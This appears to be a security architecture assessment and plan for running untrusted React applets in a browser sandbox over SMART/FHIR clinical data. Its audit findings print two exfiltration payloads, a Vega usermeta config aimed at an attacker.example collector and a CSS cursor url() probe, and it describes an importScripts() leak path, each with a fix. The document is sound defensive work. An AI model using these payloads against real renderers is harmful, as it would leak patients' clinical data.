# Comprehensive Analysis and Plan: Open React Development in a Browser-Only Clinical Applet Sandbox

**Status:** Architecture assessment and implementation plan  
**Date:** June 22, 2026  
**Reviewed baseline:**

- `Pasted markdown(12).md`, SHA-256 `a3e4235c15734fd702743a64e3bce0065bb4d8b29b8581ec76732bd4da83ddbe`
- `beyond-spike.zip`, SHA-256 `249b2f181215ee8a9b9edc89ec9981bb6d51c3e8ac5244a017b396b433be587b`

This document consolidates the current security assessment, the desired developer experience, the recommended target architecture, the immediate security corrections, and a phased plan for evolving the spike into a broad browser-only React application platform for clinical data.

---

## 1. Executive summary

The current architecture has the right foundational idea:

- A trusted browser shell owns the SMART launch, bearer token, protected LLM integrations, audit, and policy.
- Untrusted or LLM-authored applet code runs in a Dedicated Worker created inside an opaque-origin sandboxed iframe.
- The applet has no real DOM and no direct network authority.
- Clinical data and model access are exposed over a narrow MessagePort broker.
- UI is transmitted to the trusted shell through Remote DOM and rendered by trusted host code.

The principal product limitation is not React itself. The limitation is that the **small host component catalog is currently part of the security boundary**. Developers can use hooks and arbitrary JavaScript, but they can only express UI through bespoke components such as `Stack`, `Card`, `Select`, and `Vega`. That creates a React-shaped experience rather than an open React application experience.

The recommended evolution is:

> **Keep the worker and tokenless broker, but move the UI security boundary from a small design-system catalog to a generated, host-enforced Safe DOM policy.**

Developers should be able to write familiar TSX:

```tsx
<main className={styles.page}>
  <header>
    <h1>Growth explorer</h1>
    <label>
      Reference population
      <select value={population} onChange={handlePopulationChange}>
        <option value="CDC">CDC</option>
        <option value="WHO">WHO</option>
      </select>
    </label>
  </header>

  <section className={styles.workspace}>
    <canvas ref={chartRef} aria-label="Normalized growth chart" />
    <table>{/* ordinary React-rendered rows */}</table>
  </section>
</main>
```

Under the hood, a custom JSX compatibility runtime maps safe intrinsic elements to Remote DOM elements. A trusted host-side **mutation firewall** validates every element, property, event, style, resource reference, and quota before any real DOM operation occurs.

The resulting platform should have three UI lanes:

1. **Safe DOM primitives** for ordinary React markup, forms, tables, layout, CSS, events, focus, and accessibility.
2. **Optimized host widgets** for expensive or security-sensitive capabilities such as Vega, virtualized grids, clinical timelines, protected document viewing, and terminology controls.
3. **OffscreenCanvas and a safe SVG subset** for custom, high-performance graphics such as the SMART Growth Chart experience.

The existing clinical component library should remain, but as an optional productivity and accessibility layer rather than the only permitted UI vocabulary.

Before widening the UI surface, several current implementation issues must be closed. The most important are:

- Applet-controlled Vega `usermeta.embedOptions` can bypass the current sanitizer and influence Vega-Embed loading and options.
- Vega cursor values can contain CSS `url()` values.
- The classic worker policy currently leaves an `importScripts()` loading path through allowed script origins.
- The worker receives the raw Remote DOM receiver connection; remote element declarations are not a sufficient host-side security control.
- FHIR response limits are enforced after complete retrieval, parsing, and pagination rather than during transport.
- Applet identity and provenance are self-declared or URL-derived without a hardened manifest and integrity process.

The expansion to Safe DOM should begin only after these boundary issues are closed and an independent canary-network test confirms that the current platform has no known silent programmatic exfiltration path.

---

## 2. Product objective and security objective

### 2.1 Product objective

Enable clinicians, clinical informaticians, internal developers, and LLM-assisted authoring tools to build sophisticated browser applications over the data available in the current SMART session, without requiring bespoke backend code execution or a security review of every line of each applet.

The target includes applications with:

- Complex React state and component composition.
- Responsive layouts and ordinary forms.
- Large data tables and virtualized lists.
- Animated clinical graphics.
- Longitudinal note exploration and browser-side filtering.
- FHIR searches across the resources granted by the clinician’s SMART token.
- BAA-governed LLM calls, structured output, and tool use.
- Browser-side code generated by an LLM and executed in the same sandbox.
- Rich accessibility and keyboard behavior.
- Familiar TypeScript, TSX, CSS Modules, and package use.

### 2.2 Security objective

The defensible claim remains intentionally limited:

> Ordinary, malicious, or LLM-generated applet code cannot silently transmit clinical data to an arbitrary network destination using the browser APIs or rendered UI sinks made available by the platform. It can communicate only through explicitly brokered clinical, LLM, UI, audit, and resource capabilities enforced by the trusted shell.

This is not a claim that no disclosure can ever occur. The platform does not prevent:

- An authorized clinician from reading, copying, printing, photographing, or manually transcribing displayed data.
- A compromised operating system, browser, malicious extension, or browser zero-day.
- A defect or compromise in the trusted shell, broker, mutation firewall, resource renderer, or other trusted dependency.
- Misuse of an intentionally granted FHIR write capability.
- Data sent by policy to an approved, BAA-covered LLM endpoint.
- Covert timing or behavioral channels through legitimate, rate-limited broker operations.

### 2.3 No server-side code execution

All applet JavaScript, generated code, filtering, transformations, search logic, and visualization code should run in the browser worker. The architecture may call existing remote services such as the EHR FHIR endpoint and approved LLM inference APIs, but it does not require a custom server-side code runner or server-side applet execution tier.

---

## 3. Assessment of the current implementation

### 3.1 What is already strong

The current implementation has several valuable architectural properties that should be retained.

#### Trusted token ownership

The SMART token remains in the trusted wrapper and its trusted-origin `fhirclient` state. The applet receives a broad `fhirRequest()` capability rather than the bearer token. This preserves token-equivalent data access without exposing a reusable credential.

#### Broad FHIR semantics

The FHIR capability intentionally does not impose a resource-profile allowlist. Relative requests are confined to the configured SMART FHIR base, and the FHIR server plus granted SMART scopes remain the semantic authorization boundary. This matches the desired product direction better than a highly specific capability per resource or view.

#### Browser-only untrusted execution

The applet is built as a self-contained classic worker bundle and executes in a Dedicated Worker created from source text inside a sandboxed, opaque-origin iframe. This isolates it from the wrapper’s DOM, credentials, and storage.

#### Real React state and composition

The applet already uses React, ReactDOM, Zustand, and arbitrary pure JavaScript libraries in the worker. The architecture therefore does not need to replace React; it needs to improve the rendering contract and SDK.

#### Runtime-loaded applets

The trusted wrapper can fetch an applet bundle from a URL, transfer its source into the sandbox, and run it without handing the applet network authority. This is an important foundation for LLM-authored and third-party applets.

#### Clear non-claims

The security document appropriately distinguishes silent programmatic exfiltration from user-mediated disclosure, compromised browsers, trusted-component compromise, and capability abuse within granted scope.

### 3.2 Why the current developer experience feels constrained

The current remote vocabulary consists of a small set of custom elements:

```text
ui-stack, ui-grid, ui-card, ui-heading, ui-text,
ui-badge, ui-alert, ui-button, ui-select, ui-slider,
ui-stat, ui-table, ui-vega, ui-code
```

This produces several forms of friction:

- Developers must learn a bespoke component language before building ordinary layouts.
- Standard React examples and existing component code cannot be pasted or ported directly.
- Familiar intrinsic elements such as `div`, `section`, `form`, `input`, `table`, `details`, and `canvas` are unavailable.
- Styling is restricted to a handful of props such as `gap`, `tone`, and `padding`.
- Event objects differ from normal React events.
- Refs, focus, selection, measurement, portals, resize observation, and scrolling are not general platform features.
- The current table component sends full row arrays as a property instead of allowing normal React row composition or virtualization.
- The current Vega component re-embeds the full visualization whenever the spec changes, limiting high-frequency interaction and animation.
- Every new UI idea requires a trusted host component addition, which turns product design decisions into security-boundary changes.

### 3.3 Current implementation issues that must be fixed first

The architecture remains promising, but the current artifact has security gaps that should be treated as release blockers before opening the rendering surface.

#### 3.3.1 Vega-Embed option injection

The current `sanitizeVegaSpec()` recursively rejects keys including `url`, `href`, `src`, `image`, `loader`, and `baseURL`. It does not reject `usermeta`.

A specification can contain:

```json
{
  "usermeta": {
    "embedOptions": {
      "config": "//attacker.example/collect?data=SENSITIVE_DATA"
    }
  },
  "data": {"values": [{"x": 1}]},
  "mark": "point",
  "encoding": {"x": {"field": "x", "type": "quantitative"}}
}
```

Static review and execution of the current sanitizer show that this shape is accepted. Vega-Embed reads applet-supplied `usermeta.embedOptions`, can load string-valued configuration or patches, and can merge those options over the trusted options passed by the renderer. This can potentially restore actions, change the renderer or interpreter mode, introduce a post-sanitization patch, or cause a host-side fetch.

Required correction:

- Reject `usermeta` entirely for untrusted specifications.
- Install a trusted Vega loader whose `load()` always rejects.
- Freeze trusted embed options.
- Reject applet-controlled patch, configuration, loader, editor, view-class, and action options.
- Validate both the source specification and the compiled Vega specification.
- Add canary tests for `config`, `patch`, `loader`, `editorUrl`, `actions`, `renderer`, `ast`, and indirect data loading.

#### 3.3.2 CSS cursor URLs through Vega

Vega supports CSS cursor values. The current sanitizer accepts values such as:

```json
{
  "mark": {
    "type": "point",
    "cursor": "url(/probe?data=SENSITIVE_DATA), auto"
  }
}
```

The host renderer can assign the resulting value to `style.cursor`, and the current host CSP permits same-origin images. Required correction:

- Allowlist ordinary cursor keywords.
- Reject any cursor containing `url(` or other image syntax.
- Remove same-origin image loading from host CSP unless it is required by a trusted resource renderer.
- Route all protected images through opaque resource handles.

#### 3.3.3 Classic worker `importScripts()`

The classic worker format is currently necessary for the self-contained Blob-worker flow in the opaque launcher. Classic workers expose `importScripts()`. The sandbox policy currently includes a URL source in `script-src`, which means a hostile applet may be able to attempt a script request whose URL encodes data. A failed response can still disclose the request to a server or access log.

Required production policy:

```text
script-src 'nonce-<per-response-value>';
worker-src blob:;
connect-src 'none';
```

The nonce authorizes the trusted launcher script but supplies no URL source that `importScripts()` can use. A hash-authorized launcher is another option for a static deployment. Test the exact emitted artifact across the browser matrix.

Also inject a prelude before any applet module code that disables or shadows `importScripts`, nested `Worker`, `SharedWorker`, and other unnecessary ambient constructors. The CSP remains the confidentiality control; the prelude reduces accidental use and resource-exhaustion opportunities.

#### 3.3.4 Raw Remote DOM connection

The trusted host currently returns `receiver.connection` directly to the worker. A hostile applet can attempt to bypass friendly `RemoteElement` declarations and submit low-level mutation records.

Remote-side declarations should be considered ergonomic metadata only. The host must independently validate every mutation before it reaches the receiver.

#### 3.3.5 FHIR response budget is enforced too late

The current four-megabyte response check runs after the transport has fetched, parsed, assembled, and serialized the response. With automatic multi-page retrieval, the browser may consume substantial network, memory, and parsing resources before the limit is applied.

Required correction:

- Enforce a finite page count.
- Count cumulative resources and bytes incrementally.
- Use page callbacks or explicit paging rather than unbounded materialization.
- Reject or stop before parsing oversized bodies when response streaming is available.
- Add request cancellation and caller abort propagation.

#### 3.3.6 Applet provenance and identity

The applet currently declares its own ID and version during `connect()`, and the wrapper can fetch any CORS-enabled URL without a source-size limit, final-URL validation, MIME allowlist, content hash, or signature.

Containment should not depend on provenance, but production governance does. Host-derived identity is needed for audit, revocation, capability policy, reproducibility, and incident response.

Required correction:

- Fetch with `credentials: 'omit'`.
- Reject redirects or validate the final URL.
- Enforce a JavaScript MIME allowlist and source-size limit.
- Calculate and record a content hash.
- Load a signed or hash-pinned applet manifest.
- Derive immutable applet identity from the trusted manifest and artifact hash, not from worker input.

#### 3.3.7 Availability and lifecycle containment

A disallowed element currently can throw through `RemoteRootRenderer` and blank the wrapper surface. Add:

- An error boundary around the applet UI.
- Worker termination on protocol or rendering violation.
- Receiver reset and resource cleanup.
- A heartbeat and watchdog.
- A user-visible restart control.

---

## 4. The core architectural decision

### 4.1 Keep the worker boundary

Do not restore direct applet access to a real browser document.

A direct DOM iframe—even with severe CSP—retains navigation and user-mediated resource behaviors that are difficult to eliminate comprehensively. The current testing already found residual navigation through `location`, meta refresh, and links in a locked iframe. Giving untrusted code a real document would also expose a broad and evolving set of browser sinks.

The worker remains valuable because it has no browsing context. React state, data processing, generated code, D3 calculations, search, and application logic can all run there without direct access to the wrapper DOM.

### 4.2 Move from component-based policy to sink-based policy

The current model effectively says:

> Only these product-designed components may be rendered.

The recommended model says:

> A broad set of familiar elements and behaviors may be rendered, but every security-relevant sink is validated or brokered by the host.

The host policy should classify operations by effect:

- Plain text and numbers.
- Safe local identifiers.
- Accessibility metadata.
- Bounded style declarations.
- Serialized event callbacks.
- Focus and measurement methods.
- Brokered navigation.
- Brokered protected resources.
- Prohibited raw HTML, script, URL, and embedding sinks.

This change preserves control while removing most product opinionation.

### 4.3 Keep the clinical UI library, but make it optional

The existing catalog should evolve into packages such as:

```text
@safe-smart/ui
@safe-smart/clinical-ui
@safe-smart/vega
```

These packages can provide accessible, high-productivity components:

```tsx
<PatientBanner />
<ClinicalTimeline />
<FhirDataGrid />
<MedicationList />
<VegaChart />
```

They should be implemented on top of Safe DOM and host widgets. They should not be the only legal way to express layout and interaction.

---

## 5. Recommended target architecture

```text
Trusted browser shell
│
├─ SMART App Launch and trusted-origin credential state
├─ broad tokenless FHIR broker
├─ BAA-governed LLM broker
├─ applet manifest, hash, provenance and policy
├─ control/audit/watchdog channel
│
├─ Safe DOM host
│   ├─ validated mutation gateway
│   ├─ generated element/property/event policy
│   ├─ contained ShadowRoot applet surface
│   ├─ explicit DOM sink adapters
│   ├─ CSS parser, validator and stylesheet registry
│   ├─ resource and navigation handle registry
│   ├─ event snapshot serializer
│   └─ quotas and lifecycle cleanup
│
├─ optimized trusted widgets
│   ├─ Vega/Vega-Lite
│   ├─ virtual data grid
│   ├─ clinical timeline
│   ├─ protected attachment viewer
│   └─ host portal layers
│
└─ sandboxed opaque-origin launcher
    └─ self-contained classic Dedicated Worker
        ├─ React and ReactDOM
        ├─ Safe React JSX compatibility runtime
        ├─ Remote DOM polyfill
        ├─ applet code and bundled packages
        ├─ browser-side data processing
        ├─ optional OffscreenCanvas rendering
        └─ no ambient credential or general network authority

Dedicated logical channels
  1. control, heartbeat and lifecycle
  2. Safe DOM mutation/event stream
  3. FHIR/LLM/resource capability RPC
  4. optional canvas transfer and graphics events
```

Separate channels or separately scheduled queues prevent a mutation flood from starving cancellation, watchdog, or clinical capability messages.

---

## 6. Safe React compatibility layer

### 6.1 Developer-facing goal

Applet authors should write ordinary React components with normal intrinsic JSX, hooks, context, reducers, suspense-compatible state, and familiar event handlers. They should not need to import Remote DOM or know about internal `safe-*` tags.

### 6.2 Internal intrinsic-element mapping

Remote DOM works naturally with custom elements. Standard custom-element registration requires hyphenated names, so the runtime can map developer-facing intrinsic types to internal elements:

```text
div      -> safe-div
button   -> safe-button
input    -> safe-input
table    -> safe-table
canvas   -> safe-canvas
```

The recommended implementation is a custom JSX runtime package:

```json
{
  "compilerOptions": {
    "jsx": "react-jsx",
    "jsxImportSource": "@safe-smart/react"
  }
}
```

Conceptually:

```ts
import * as ReactJsx from 'react/jsx-runtime';
import {safeIntrinsicComponents} from './generated-intrinsics';

export function jsx(type: unknown, props: unknown, key: unknown) {
  const mapped =
    typeof type === 'string'
      ? safeIntrinsicComponents[type] ?? UnsupportedIntrinsic
      : type;

  return ReactJsx.jsx(mapped, props, key);
}
```

The build pipeline should also alias `react/jsx-runtime` and `react/jsx-dev-runtime` for compatible precompiled dependencies. Packages using direct `React.createElement('div', ...)` need either a compile transform, a React compatibility wrapper, or an explicit compatibility classification.

Do not promise universal React package compatibility. Define and test a supported subset.

### 6.3 Generated policy schema

A single versioned schema should generate the worker definitions, host validators, TypeScript intrinsic types, documentation, and hostile tests.

```ts
interface ElementPolicy {
  children: ChildPolicy;
  attributes: Record<string, ValuePolicy>;
  properties: Record<string, ValuePolicy>;
  events: Record<string, EventPolicy>;
  methods: Record<string, MethodPolicy>;
  limits: ElementLimits;
  hostAdapter: HostAdapterName;
}
```

Generated outputs should include:

1. `JSX.IntrinsicElements` types.
2. Remote element classes and registrations.
3. React wrappers for intrinsic tags.
4. Host mutation validators.
5. Host event serializers.
6. Safe DOM documentation.
7. Property-based and fuzz-test corpora.
8. A machine-readable compatibility manifest.

This avoids drift between compile-time ergonomics and runtime enforcement.

### 6.4 Initial element profile

A useful initial Safe DOM profile can support:

#### Structural and semantic elements

```text
div, span, main, section, article, header, footer, nav, aside
h1-h6, p, pre, code, blockquote, strong, em, small, mark
ul, ol, li, dl, dt, dd
```

#### Tables

```text
table, caption, colgroup, col, thead, tbody, tfoot, tr, th, td
```

#### Controls

```text
button, label, input, textarea, select, option, optgroup
fieldset, legend, progress, meter, details, summary
```

#### Specialized host-mediated elements

```text
a, img, canvas, dialog, form, svg
```

#### Prohibited elements

```text
script, iframe, object, embed, base, meta, link, style,
portal, template with raw HTML, frame, frameset
```

Some familiar tags should map to safer host implementations rather than native behavior:

- `<a>` becomes a host-mediated navigation control.
- `<form>` never performs native network submission.
- `<dialog>` uses a host portal rather than unrestricted top-layer behavior.
- `<img>` accepts a resource handle rather than a URL.
- `<canvas>` maps to a controlled OffscreenCanvas capability.

### 6.5 Property classes

Properties should be classified by security effect:

```ts
type ValuePolicy =
  | PlainText
  | BoundedNumber
  | BooleanValue
  | Enumeration
  | LocalIdentifier
  | AriaReference
  | ClassTokenList
  | ValidatedStyleObject
  | EventCallback
  | NavigationHandle
  | ResourceHandle
  | Prohibited;
```

Examples:

| Property | Policy |
|---|---|
| `title`, `role`, `aria-*` | Bounded text and enums |
| `data-*` | Bounded text with total-size limits |
| `id` | Automatically namespaced to the applet |
| `tabIndex` | Bounded integer |
| `className` | Class names declared by the validated stylesheet manifest |
| `style` | Parsed and validated declaration map |
| `onClick`, `onChange` | Registered callback capability |
| `href` | `NavigationHandle`, never a raw string |
| `src` | `ResourceHandle`, never a raw string |
| `dangerouslySetInnerHTML` | Prohibited |
| `innerHTML`, `outerHTML`, `srcdoc` | Prohibited |
| `action`, `formAction` | Prohibited or brokered action handle |

Compile-time branded types improve ergonomics, but the host must treat every value as hostile and verify the handle against its session-bound registry.

---

## 7. Host-side mutation firewall

### 7.1 Security role

The mutation firewall becomes the central UI security control. It must sit between the worker’s connection object and the Remote DOM receiver or DOM applier.

```text
Untrusted worker mutation records
              │
              ▼
ValidatedMutationGateway
  • protocol version and record schema
  • element allowlist
  • attribute/property policy
  • value validation
  • event and method policy
  • node graph consistency
  • resource/navigation handles
  • quotas and rate limits
              │
              ▼
SafeDOMReceiver / RemoteReceiver
              │
              ▼
Contained host DOM
```

### 7.2 Validation requirements

Validate at least:

- Mutation record type and field count.
- Maximum records per batch.
- Maximum batch bytes.
- Node identifiers, uniqueness, ownership, and parent existence.
- Tree depth and connected-node count.
- Allowed node types.
- Allowed element name.
- Allowed property, attribute, method, and event names for that element.
- Exact value type, string length, array length, object depth, and total bytes.
- Callback capability count and lifetime.
- No prototype-bearing or unexpected object graphs.
- No references to nodes outside the applet root.
- No movement of a node between applet sessions.
- No session or patient capability reuse.
- Mutation rate and sustained bandwidth.

Reject a malformed batch atomically. On a severe or repeated violation, terminate the worker and clear the applet surface.

### 7.3 Host rendering implementation options

There are two reasonable host implementations.

#### Option A: generic React renderer map

Continue using `RemoteReceiver` and `RemoteRootRenderer`, but generate renderer entries for the Safe DOM profile. Each renderer explicitly maps validated values to a real DOM element.

Advantages:

- Fastest path from the current spike.
- Reuses existing React host infrastructure.
- Easy integration of host widgets and error boundaries.

Costs:

- A host React component per primitive node.
- More overhead for large trees.
- More code between mutation and DOM.

#### Option B: custom SafeDOMReceiver

Apply validated mutations directly to a contained ShadowRoot using explicit sink adapters. This is not the unrestricted `DOMRemoteReceiver`; it is a receiver whose only operations are generated from the Safe DOM schema.

Advantages:

- Closer to native DOM performance.
- Fewer host React rerenders.
- Natural fit for large ordinary element trees.

Costs:

- More trusted code to implement and audit.
- Event and property semantics must be implemented carefully.
- Trusted widget islands require explicit integration.

Recommendation:

> Build the first Safe DOM spike with the generated React renderer map, while keeping the mutation firewall independent of the renderer. Benchmark the growth-chart acceptance application. Move primitive rendering to a custom SafeDOMReceiver only if profiling demonstrates a meaningful need.

Do not use an unrestricted DOM mirroring receiver directly.

---

## 8. Styling architecture

Rich React development requires substantially more than token props, but raw unvalidated CSS would reintroduce resource, layout, and UI-redressing sinks.

### 8.1 Contained applet surface

Render each applet into a dedicated host element with a ShadowRoot. The host should apply containment such as:

```css
.safe-applet-root {
  position: relative;
  isolation: isolate;
  contain: layout paint style;
  overflow: auto;
  min-width: 0;
  min-height: 0;
}
```

The shell controls the applet’s actual viewport. Shadow DOM and CSS containment are defense in depth and style-isolation tools, not confidentiality boundaries.

### 8.2 CSS Modules

Support ordinary imports:

```tsx
import styles from './growth-chart.module.css';
```

The browser build pipeline should produce:

```text
worker.js
styles.manifest.json
applet.manifest.json
```

The stylesheet manifest contains scoped class names, validated CSS text, hashes, and declared animation names. The host validates the CSS independently before installing it into the applet ShadowRoot.

### 8.3 CSS parser and validator

Use an AST-based parser such as CSSTree rather than regular expressions. The validator should:

- Parse selectors, declarations, at-rules, and values.
- Scope selectors to the applet root or ShadowRoot.
- Reject parse errors and unknown constructs by default.
- Reject every URL-bearing token or function, including nested image syntax.
- Reject `@import`, `@font-face`, `@namespace`, `@page`, and unreviewed global at-rules.
- Reject selectors that escape the applet root, including `:host-context`, global roots, and unreviewed shadow-piercing constructs.
- Restrict `z-index` to a bounded local range.
- Reject or tightly constrain `position: fixed`.
- Restrict top-layer behavior and native popover activation.
- Cap selector length, declaration count, keyframes, and stylesheet bytes.
- Validate custom-property values and prevent them from hiding forbidden tokens.

A useful initial allowed set can include:

- Flexbox and grid.
- Typography, spacing, sizing, and overflow.
- Borders, radius, shadows, and gradients without URLs.
- Transforms, transitions, and keyframe animation.
- Media queries and container queries.
- Bounded absolute and sticky positioning.
- Pseudo-classes and selected pseudo-elements.

### 8.4 Inline style objects

Support familiar React style objects:

```tsx
<div
  style={{
    display: 'grid',
    gridTemplateColumns: 'repeat(auto-fit, minmax(18rem, 1fr))',
    gap: '1rem',
    padding: 'clamp(0.75rem, 2vw, 2rem)',
  }}
/>
```

The worker serializes the object; the host normalizes property names and applies the same declaration validator used for CSS Modules.

### 8.5 `className` handling

`className` should accept only class tokens declared in the current applet stylesheet manifest. Dynamic combinations remain possible:

```tsx
<div className={`${styles.card} ${active ? styles.active : ''}`} />
```

Unknown class tokens are ignored or rejected according to the runtime mode. Development mode should produce a clear diagnostic.

---

## 9. Events, refs, measurement, and portals

### 9.1 Familiar React event handlers

Developers should write:

```tsx
<button onClick={save}>Save</button>
<input value={query} onChange={(event) => setQuery(event.currentTarget.value)} />
```

The host sends a serialized event snapshot. The worker reconstructs a small SyntheticEvent-compatible object.

```ts
interface SafeInputEventSnapshot {
  type: 'input' | 'change';
  value: string;
  checked?: boolean;
  selectionStart?: number;
  selectionEnd?: number;
  key?: string;
  modifiers?: number;
  timeStamp: number;
}
```

Never send a real DOM node, `window`, `document`, `DataTransfer`, clipboard object, raw URL, or browser-owned object to the worker.

High-frequency pointer, wheel, and resize events should be coalesced and rate-limited.

### 9.2 Default behavior

Cross-thread `preventDefault()` cannot reliably stop a synchronous browser default after an event has already crossed the worker boundary. Therefore:

- Links never perform arbitrary native navigation.
- Forms never perform native network submission.
- Drag-and-drop is disabled or brokered.
- Security-relevant defaults are prevented in the host before dispatch.
- `preventDefault()` and `stopPropagation()` may still be implemented for remote-tree semantics.

### 9.3 Safe refs and methods

Provide a remote element reference:

```ts
interface SafeElementRef {
  focus(): Promise<void>;
  blur(): Promise<void>;
  scrollIntoView(options?: SafeScrollOptions): Promise<void>;
  setSelectionRange(start: number, end: number): Promise<void>;
  measure(): Promise<SafeDOMRect>;
}
```

Support hooks backed by host observers:

```tsx
const rect = useElementRect(ref);
const visible = useElementVisibility(ref);
```

Synchronous layout reads remain a compatibility limit. Packages requiring immediate `getBoundingClientRect()` after mutation may need an adapter or cached measurement semantics.

### 9.4 Host portals

Expose named portal layers:

```tsx
createSafePortal(<Tooltip />, 'tooltip');
createSafePortal(<Dialog />, 'modal');
createSafePortal(<Menu />, 'popover');
```

The worker never receives a real DOM portal target. The host owns focus trapping, clipping, z-order, and dismissal behavior.

---

## 10. Rich graphics and performance

### 10.1 Vega and Vega-Lite as a first-class host widget

Vega-Lite remains valuable for declarative clinical visualization, but the API should separate the mostly immutable specification from frequently changing data and signals:

```tsx
<VegaChart
  spec={growthChartSpec}
  data={{measurements, referenceCurves}}
  signals={{population, sex, diseaseState, selectedAge}}
  onSignalChange={handleSignalChange}
/>
```

The host should instantiate the Vega View once, then update named datasets and signals through the Vega View API and `runAsync()`. Re-embedding on every state change should be avoided.

Security requirements:

- Reject `usermeta` and all external loading options.
- Use a loader that cannot access URLs.
- Use the Vega expression interpreter and remove `unsafe-eval` if validation succeeds.
- Allowlist cursor keywords.
- Validate source and compiled specs.
- Bound specification size, data rows, marks, signals, and update frequency.
- Disable actions, editor integration, downloads, and source viewing unless the host explicitly provides them.

### 10.2 OffscreenCanvas for custom graphics

OffscreenCanvas is the principal escape hatch for growth-chart-quality custom rendering.

The host creates a real `<canvas>`, calls `transferControlToOffscreen()`, and transfers the resulting object to the applet worker over a dedicated channel. The worker can use Canvas 2D and, after a separate decision, WebGL.

A developer-facing API can look like:

```tsx
function GrowthChart({measurements, curves}: Props) {
  const canvas = useCanvasSurface();

  useEffect(() => {
    if (!canvas.offscreen) return;

    return renderGrowthChart(canvas.offscreen, {
      measurements,
      curves,
      width: canvas.width,
      height: canvas.height,
    });
  }, [canvas.offscreen, canvas.width, canvas.height, measurements, curves]);

  return (
    <canvas
      ref={canvas.ref}
      aria-label="Normalized growth chart"
      onPointerMove={canvas.onPointerMove}
      onKeyDown={canvas.onKeyDown}
    />
  );
}
```

Apply limits to:

- Canvas pixel count and dimensions.
- Number of active canvases.
- Frame rate and event rate.
- WebGL context count if enabled.
- Worker memory and lifetime.

Canvas content is visible output and can encode data visually, just like text or charts. It does not create a silent network channel when network and resource sinks remain blocked.

### 10.3 Safe SVG subset

A safe SVG profile is also useful for D3-based, accessible, resolution-independent charts. Support selected elements:

```text
svg, g, path, rect, circle, ellipse, line, polyline,
polygon, text, tspan, title, desc, defs, linearGradient,
radialGradient, stop, clipPath
```

Block or mediate:

```text
script, foreignObject, image, use, a, feImage,
external href/xlink:href, URL filters, external masks
```

Bound path length, node count, coordinate magnitudes, and text length.

### 10.4 Large tables and notes

Ordinary React tables should be available, but very large clinical result sets should use virtualization. Provide an optional trusted `VirtualList` or `DataGrid` host widget while allowing headless table logic to run in the worker.

For large note bodies:

- Keep raw text in the worker when practical.
- Render only visible excerpts.
- Use bounded browser-side indexes.
- Consider transferable ArrayBuffers or columnar data for large analytical datasets.
- Terminate pathological regular expressions or use a bounded/linear-time regex implementation where necessary.

---

## 11. Broad FHIR capability with better ergonomics

### 11.1 Preserve token-equivalent resource access

The primary FHIR capability should remain broad within the SMART session. Do not require a resource-specific capability for every application.

The security contract is:

- The applet does not receive the token.
- Requests are confined to the active SMART FHIR base.
- The FHIR server and granted SMART scopes determine semantic access.
- The broker applies method, size, timeout, header, redirect, and audit controls.

### 11.2 Developer-facing API

Provide both a typed SDK and a fetch-compatible sentinel origin:

```ts
const bundle = await fhir.search<Observation>('Observation', {
  patient: context.patient.id,
  category: 'vital-signs',
  _count: 200,
});
```

and:

```ts
const response = await fetch(
  'https://fhir.internal/Observation?patient=current&category=vital-signs',
);
const bundle = await response.json();
```

The sentinel URL is never fetched from the network. The runtime recognizes the exact internal origin and translates it into a MessagePort broker call. Any other `fetch()` remains blocked by CSP.

Suggested API:

```ts
interface ClinicalFhirClient {
  request<T>(path: string, options?: FhirRequestOptions): Promise<T>;
  read<T>(resourceType: string, id: string): Promise<T>;
  search<T>(resourceType: string, query: SearchParameters): Promise<FhirBundle<T>>;
  pages<T>(path: string, options?: PageOptions): AsyncIterable<FhirPage<T>>;
}
```

### 11.3 Request controls

Use a request-header allowlist rather than a denylist. Candidate headers include:

```text
accept
content-type
if-match
if-none-match
if-modified-since
prefer
```

Reject method override, proxy routing, credential, origin, and forwarding headers. Reject ambiguous encoded path separators and traversal forms. Validate every redirect and final URL in the trusted transport.

### 11.4 Paging and response budgets

Enforce limits during retrieval:

- Maximum pages.
- Maximum resources.
- Maximum bytes per page and cumulatively.
- Maximum elapsed time.
- Maximum concurrent requests.
- Caller cancellation.

Return an async iterator for large searches so applets can process incrementally without materializing an unbounded bundle.

### 11.5 Read and write policy

A broad read capability should be the default innovation surface. Writes are not primarily an exfiltration question; they are a data-integrity and clinical-safety question.

Recommended capability classes:

```text
smart-user-read:  all methods that do not modify FHIR state, within token scope
smart-user-write: token-equivalent writes, separately granted and audited
```

This avoids resource-profile micromanagement while still recognizing the materially different risk of creating, updating, or deleting clinical data.

---

## 12. LLM ergonomics and browser-side generated code

### 12.1 Approved inference profiles

The trusted shell should expose named, BAA-governed model profiles. The applet should not receive provider credentials or arbitrary endpoint URLs.

The OpenAI-compatible bridge is a good ergonomic direction. Expand it carefully to support:

- Chat or response-style requests.
- Structured output schemas.
- Streaming over MessagePort.
- Cancellation.
- Usage accounting.
- Approved local tool calls.
- Clear mapping from developer-visible `model` to a trusted profile.

### 12.2 Tool use

LLM tools should call the same browser broker and worker APIs available to ordinary code:

```text
fhir.request
fhir.pages
notes.search
notes.regex
ui state operations
approved llm profile calls
```

Do not provide a generic URL fetch tool, arbitrary browser navigation, remote MCP endpoint, or unrestricted connector.

### 12.3 Generated code

LLM-generated TypeScript or JavaScript can be compiled in the browser and loaded into a fresh applet worker. It receives no more authority than hand-written applet code.

The authoring loop can be:

```text
prompt or edit source
      ↓
in-browser TypeScript check
      ↓
esbuild-wasm bundle
      ↓
CSS and manifest validation
      ↓
terminate old applet worker
      ↓
launch new self-contained worker
```

No generated code executes in the trusted editor or host page.

---

## 13. Browser-only authoring environment

### 13.1 Recommended components

- Monaco editor.
- TypeScript language service in an editor worker.
- `esbuild-wasm` in a separate build worker.
- Virtual project filesystem.
- Package metadata and content-addressed cache.
- Source maps and trusted error overlay.
- Safe DOM type definitions and autocomplete.
- Manifest and capability editor.
- Hostile-pattern diagnostics.
- Preview worker replacement for hot reload.

### 13.2 Build security model

Esbuild is a bundler, not a sandbox. Run it in a separate worker that has:

- No SMART token.
- No clinical data.
- No general network access during compilation.
- A virtual filesystem containing only project and package files.
- CPU, memory, source-size, and build-time limits.

Do not execute npm lifecycle scripts. Do not load applet-supplied esbuild plugins. Package code is parsed and bundled as untrusted source; it is not executed until it enters the applet worker.

### 13.3 Package resolution

Two package modes can coexist:

#### Curated packages

Pretested libraries with known compatibility, cached and pinned by hash.

#### Bring-your-own packages

Package source is downloaded by the trusted authoring environment without clinical context, bundled into the applet, and treated as fully untrusted at runtime. Lifecycle scripts and arbitrary build plugins are never run.

This allows broad experimentation without claiming that every npm package is compatible or safe to execute in the trusted shell.

### 13.4 Output invariants

Every applet build must produce:

- One self-contained classic worker script.
- No unresolved static or dynamic imports.
- No runtime CDN dependencies.
- No remote source-map references.
- A CSS manifest.
- A package and version manifest.
